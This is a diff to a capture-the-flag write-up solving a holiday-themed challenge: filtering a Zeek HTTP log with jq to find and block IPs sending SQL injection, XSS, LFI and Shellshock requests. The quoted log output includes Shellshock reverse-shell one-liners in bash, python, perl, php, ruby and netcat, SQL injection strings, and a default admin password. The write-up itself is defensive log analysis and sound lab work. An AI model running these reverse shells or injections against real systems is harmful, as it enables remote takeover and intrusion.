@@ -3586,7 +3586,7 @@ Hints:
 - Be sure to examine that printed circuit board.
 
 Solution:  
-Inspect the element of the last lock. Find the div named 'cover' and move it up the dom.
+Inspect the element of the last lock. Find the div named `cover` and move it up the dom.
 We can just examine the right side of the circuit board to find the key for this lock.
 
 ![Doorcode Cover](images/doorcode_cover.png)
@@ -3626,14 +3626,320 @@ The code for this challenge is `The Tooth Fairy`
 ### Filter Out Poisoned Sources of Weather Data
 #### Context
 Objective
-> 
+> Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software.
+> Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID ("RID") success value that you're given.
+> For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.
+
+Hint:
+Wunorse Openslae
+> That's got to be the one - thanks!
+> Hey, you know what? We've got a crisis here.
+> You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.
+> All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!
+> I'm so flummoxed I can't even remember how to login!
+> Hmm... Maybe the Zeek http.log could help us.
+> I worry about LFI, XSS, and SQLi in the Zeek log - oh my!
+> And I'd be shocked if there weren't some shell stuff in there too.
+> I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.
+> If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.
+> The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.
+> Try not to block many legitimate weather station IPs as that could also cause route calculation failure.
+> Remember, when looking at JSON data, `jq` is the tool for you!
+
+
+Sleigh Route Finder API:  
+https://srf.elfu.org/
+
+
+Zeek logs:  
+https://downloads.elfu.org/http.log.gz
+
+
+Location:  
+sleighshop (Sleigh Workshop)
+
 
 #### Solution
+We can search through the logfile using JQ. For example, to select all the POST requests we could do:
+```
+polle@polle-pc: $ cat http.log | jq '.[] | select (.method | contains("POST"))'
+```
+
+The first thing we need to accomplish is to get access to the Sleigh Route Finder API. We are prompted with a login form and we need username and password.
+
+![SRF Login](images/srf_login.png)
+
+We search for credentials in the zeek log file. After some searching we decide to list all of the endpoints that responded ok (statuscode = 200) and list their endpoints
+
+```
+polle@polle-pc: $ cat http.log | jq '.[] | select (.status_code == 200) | .uri' | sort | uniq
+<< Output redacted for brevity >>
+"/js/weathermap.js"
+"/logout"
+"/logout?id=1' UNION/**/SELECT 1223209983/*"
+"/logout?id=1' UNION SELECT null,null,'autosc','autoscan',null,null,null,null,null,null,null,null/*"
+"/logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\\\"><script>alert(1536286186)</script>"
+"/map.html"
+"/README.md"
+"/santa.html"
+"/vendor/bootstrap/js/bootstrap.bundle.min.js"
+"/vendor/fontawesome-free/css/all.min.css"
+"/vendor/fontawesome-free/webfonts/fa-solid-900.woff2"
+"/vendor/jquery-easing/jquery.easing.min.js"
+"/vendor/jquery/jquery.min.js"
+```
+
+We see here the file `README.md`. This caught our eye, because one of the previous challenges had us decrypt a [redacted document](relevant_files/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf). This document had a comment inside it:
+> The default login credentials should be changed on startup and can be found in the readme in
+> The ElfU Research Labs git repository.
+
+So we definitely want to check this out!
+We browse to
+```
+https://srf.elfu.org/README.md
+```
+and find the credentials we were looking for:
+
+![SRF Credentials](images/srf_creds.png)
+
+> You can login using the default admin pass:
+> `admin 924158F9522B3744F5FCD4D10FAC4356`
+
+Excellent! Now we can access the GUI and the real challenge can begin.
+
+
+![SRF Home](images/srf_homepage.png)
+
+We find an API document pdf as soon as we log in. This document describes the correct way to access the API.
+
+[API docs](relevant_files/apidocs.pdf)
+
+We want to search for bad actors. We will try to find:
+- SQLi
+- XSS
+- Shellcode
+- LFI
+
+We will create a script to do this filtering for us. But first we will prepare our data a little bit
+```
+polle@polle-pc: $ cat http.log | jq '.[]' > new.log
+polle@polle-pc: $ mv new.log http.log
+```
+
+We can quickly create some rules to search for bad actors in the logs.
+We want to search for the attack scenarios described by Wunorse Openslae.
+```
+# SQLi
+jq '. | select (.username | contains("'"'"'")) '
+jq '. | select (.uri | contains("'"'"'")) '
+jq '. | select (.user_agent | contains("'"'"'")) '
+# XSS
+jq '. | select (.uri | contains("<")) '
+jq '. | select (.host | contains("<")) '
+# LFI
+jq '. | select (."uri" | contains("pass")) '
+# Shellshock
+jq '. | select (."user_agent" | contains(":; };")) '
+```
+
+If we count the number of IPs that have made requests conforming to these rules we find 75. We need to find about 100.
+As Wunorse has told us, we then need to pivot on one of the fields.
+We will select the user agents that are used by these actors and see if any other requests use the same user agents.
+
+We can now start creating a script that uses JQ to find bad actors. The script will perform the following function:
+- Grab all IPs for the above ruleset.
+- Select all requests coming from those IPs and store them in a new zeek log file.
+- Extract the user agents used by those malicious actors
+
+You can find the full script [here](relevant_files/srf_filter_log.py)
+
+```
+polle@polle-pc: $ ./filter_log.py
+[*] Starting filtering script.
+[+] Removing all filter files
+[+] Creating filter files
+[*] Executing: cat http.log | jq '. | select (.username | contains("'"'"'")) | ."id.orig_h"' > filters/sql_injection_username.filter
+[*] Executing: cat http.log | jq '. | select (.uri | contains("'"'"'")) | ."id.orig_h"' > filters/sql_injection_uri.filter
+[*] Executing: cat http.log | jq '. | select (.user_agent | contains("'"'"'")) | ."id.orig_h"' > filters/sql_injection_agent.filter
+[*] Executing: cat http.log | jq '. | select (.uri | contains("<")) | ."id.orig_h"' > filters/xss_uri.filter
+[*] Executing: cat http.log | jq '. | select (.host | contains("<")) | ."id.orig_h"'> filters/xss_host.filter
+[*] Executing: cat http.log | jq '. | select (."uri" | contains("pass")) | ."id.orig_h"' > filters/lfi_pass.filter
+[*] Executing: cat http.log | jq '. | select (."user_agent" | contains(":; };")) | ."id.orig_h"' > filters/shell_shock.filter
+[+] Loading list of bad ip addresses. Using all files with '.filter' extension
+[*] Loading filter filters/xss_uri.filter
+[*] Loading filter filters/sql_injection_uri.filter
+[*] Loading filter filters/shell_shock.filter
+[*] Loading filter filters/sql_injection_username.filter
+[*] Loading filter filters/sql_injection_agent.filter
+[*] Loading filter filters/lfi_pass.filter
+[*] Loading filter filters/xss_host.filter
+[+] Selecting all bad ips from file http.log and writing to output malicious_requests.log
+[*] Removing all duplicate ips
+[*] number of bad ips: 75
+Filtering ip block 1 / 1
+[*] Executing: cat http.log | jq ' . | select(."id.orig_h" | contains("56.5.47.137") or contains("19.235.69.221") or contains("69.221.145.150") or contains("42.191.112.181") or contains("48.66.193.176") or contains("49.161.8.58") or contains("84.147.231.129") or contains("44.74.106.131") or contains("106.93.213.219") or contains("42.103.246.250") or contains("2.230.60.70") or contains("10.155.246.29") or contains("225.191.220.138") or contains("75.73.228.192") or contains("249.34.9.16") or contains("27.88.56.114") or contains("238.143.78.114") or contains("121.7.186.163") or contains("106.132.195.153") or contains("129.121.121.48") or contains("190.245.228.38") or contains("34.129.179.28") or contains("135.32.99.116") or contains("2.240.116.254") or contains("45.239.232.245") or contains("31.254.228.4") or contains("220.132.33.81") or contains("83.0.8.119") or contains("150.45.133.97") or contains("229.229.189.246") or contains("227.110.45.126") or contains("33.132.98.193") or contains("84.185.44.166") or contains("254.140.181.172") or contains("150.50.77.238") or contains("68.115.251.76") or contains("118.196.230.170") or contains("173.37.160.150") or contains("81.14.204.154") or contains("135.203.243.43") or contains("186.28.46.179") or contains("13.39.153.254") or contains("111.81.145.191") or contains("0.216.249.31") or contains("52.39.201.107") or contains("102.143.16.184") or contains("230.246.50.221") or contains("131.186.145.73") or contains("253.182.102.55") or contains("1.185.21.112") or contains("229.133.163.235") or contains("194.143.151.224") or contains("23.49.177.78") or contains("75.215.214.65") or contains("223.149.180.133") or contains("211.229.3.254") or contains("250.51.219.47") or contains("187.178.169.123") or contains("180.57.20.247") or contains("116.116.98.205") or contains("9.206.212.33") or contains("79.198.89.109") or contains("25.80.197.172") or contains("193.228.194.36") or contains("169.242.54.5") or contains("28.169.41.122") or contains("233.74.78.199") or contains("132.45.187.177") or contains("61.110.82.125") or contains("65.153.114.120") or contains("123.127.233.97") or contains("95.166.116.45") or contains("80.244.147.207") or contains("168.66.108.62") or contains("200.75.228.240"))' >> malicious_requests.log
+[+] Completed filtering of original file
+[+] Creating list of all user agents used by malicious requests (file malicious_requests.log) and writing to file malicious_agents.log
+[*] Executing: cat malicious_requests.log | jq '. | .user_agent' | sort -u > malicious_agents.log
+```
+
+We now have a file containing all the user agents used by malicious actors. We can see if other requests used the same user agents.
+However first we need to prepare our data a little bit. We need to double escape all of the backslashes in the file:
+```
+polle@polle-pc: $ sed -i 's#\\#\\\\#g' malicious_agents.log
+```
+Now we can use that file in a bash for-loop to count the number of times each of these user agents is used.
+
+```
+polle@polle-pc: $ while read ua; do cat http.log | jq '. | select(."user_agent" == '"$ua"') | .user_agent'; done <malicious_agents.log | sort | uniq -c | sort -nr
+     19 "Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)"
+     17 "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5"
+     15 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5"
+     14 "Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)"
+     13 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
+     13 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5"
+     13 "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5"
+     12 "Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16"
+     11 "Opera/6.05 (Windows 2000; U)  [oc]"
+     11 "Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15"
+     11 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
+     10 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)"
+     10 "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.4.15451"
+     10 "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
+      9 "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18"
+      9 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0"
+      5 "Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)"
+      3 "1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '"
+      2 "Wget/1.9+cvs-stable (Red Hat modified)"
+      2 "RookIE/1.0"
+      2 "Opera/8.81 (Windows-NT 6.1; U; en)"
+      2 "Mozilla/5.0 WinInet"
+      2 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731"
+      2 "Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)"
+      2 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13"
+      2 "Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0"
+      2 "Mozilla/5.0 (Windows NT 5.1 ; v.)"
+      2 "Mozilla/5.0 (Windows NT 10.0;Win64;x64)"
+      2 "Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)"
+      2 "Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)"
+      2 "Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N"
+      2 "Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)"
+      2 "Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)"
+      2 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)"
+      2 "Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)"
+      2 "Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )"
+      2 "Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)"
+      2 "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6."
+      2 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)"
+      2 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)"
+      2 "Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)"
+      2 "Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)"
+      2 "Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1"
+      2 "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)"
+      2 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
+      2 "Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)"
+      2 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)"
+      2 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)"
+      2 "Mozilla/4.0 (compatible MSIE 5.0;Windows_98)"
+      2 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)"
+      2 "Mozilla/4.0 (compatible; Metasploit RSPEC)"
+      2 "HttpBrowser/1.0"
+      2 "CholTBAgent"
+      1 "() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\"227.110.45.126\",43870).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+      1 "() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"150.45.133.97\",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os
+.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+      1 "() { :; }; /usr/bin/php -r '$sock=fsockopen(\"229.229.189.246\",62570);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+      1 "() { :; }; /usr/bin/perl -e 'use Socket;$i=\"83.0.8.119\";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDO
+UT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+      1 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
+      1 "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
+      1 "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36"
+      1 "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
+      1 "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"
+      1 "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1"
+      1 "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1"
+      1 "() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1"
+      1 "() { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'"
+      1 "1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1"
+      1 "1' UNION SELECT -1,'autosc','test','O:8:\\\"stdClass\\\":3:{s:3:\\\"mod\\\";s:15:\\\"resourcesmodule\\\";s:3:\\\"src\\\";s:20:\\\"@random41940ceb78dbb\\\";s:3:\\\"int\\\";s:0:\\\"\\\";}',7,0,0,0,
+0,0,0 /*"
+      1 "1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --"
+      1 "1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*"
+      1 "1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1"
+      1 "1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1"
+```
+We see that we have about 300 requests using various diffent user agents. This is clearly too many.
+```
+polle@polle-pc: $ while read ua; do cat http.log | jq '. | select(."user_agent" == '"$ua"') | .user_agent'; done <malicious_agents.log | wc -l
+294
+```
+However, upon closer inspection, we do notice that some of these user agents seem more 'normal' than others.
+All of the user agents that are used 9 or more times seem like very legit user agents. The others however, much less so.
+We take a gamble here and remove those seemingly legitimate user agents from our file `malicious_agents.log`.
+
+We now repeat the previous step and look at how many requests remain:
+```
+polle@polle-pc: $ while read ua; do cat http.log | jq '. | select(."user_agent" == '"$ua"') | .user_agent'; done <malicious_agents.log | wc -l
+97
+```
+Great, that seems much closer to our target! lets write those entries to our final log file and extract the IPs from it:
+```
+polle@polle-pc: $ while read ua; do cat http.log | jq '. | select(."user_agent" == '"$ua"')'; done <malicious_agents.log > all_malicious_req.log
+polle@polle-pc: $ cat all_malicious_req.log | jq '."id.orig_h"' > malicious_ips
+polle@polle-pc: $ tr '\n' ',' < malicious_ips | sed 's/"//g' > final_ips
+```
+
+We can now just copy the contents of `final_ips` and paste it in the SRF firewall.
+
+![SRF Firewall](images/srf_firewall.png)
+
+We submit them by selecting the `DENY` option and...
+
+![SRF Complete](images/srf_complete.png)
+
+We did it! We completed the final challenge!
+
 
 #### Code
+RID:0807198508261964
 
 
+### Ending
+Upon submitting the final code, a door opens and allows us access to the bell tower.
 
+![Bell Tower](images/bell_tower_view.png)
+
+Completing the dialog with all three NPCs here will complete the game and roll the credits.
+
+NPC: Santa
+> You did it!  Thank you!  You uncovered the sinister plot to destroy the holiday season!
+> Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!
+> Ho Ho Ho!
+> The more I laugh, the more I fill with glee.
+> And the more the glee,
+> The more I'm a merrier me!
+> Merry Christmas and Happy Holidays.
+
+
+NPC: The Tooth Fairy
+> You foiled my dastardly plan!  I’m ruined!
+> And I would have gotten away with it too, if it weren't for you meddling kids!
+
+
+NPC: Krampus
+> Congratulations on a job well done!
+> Oh, by the way, I won the Frido Sleigh contest.
+> I got 31.8% of the prizes, though I'll have to figure that out.
+> ...
+
+Credits:
+
+![Bell Tower Credits](images/bell_tower_credits.png)
+
+One last thing we notice however, is that we can expect more naughty interference next year. We spot a letter in the corner of the bell tower.
+Reading it does not bode well for the holiday season next year...
+
+![Bell Tower Letter](images/bell_tower_letter.png)
 
 -----------------------------
 ## Bonus
